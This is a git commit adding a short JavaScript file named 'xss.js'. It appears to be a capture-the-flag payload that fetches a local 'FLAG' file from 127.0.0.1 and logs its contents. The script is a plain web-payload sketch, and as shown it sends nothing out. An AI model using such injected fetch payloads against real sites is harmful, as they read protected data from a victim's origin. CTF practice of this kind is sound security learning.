422abb805962bb686fdace10634da930303c96db
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-24 13:06:08 +0100

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,17 @@
+const url = 'http://127.0.0.1/FLAG';
+
+// Fetch the text file
+fetch(url)
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.text();
+  })
+  .then(data => {
+    // Do something with the text content of the file
+    console.log(data); // Output the content of the text file
+  })
+  .catch(error => {
+    console.error('There was a problem fetching the text file:', error);
+  });
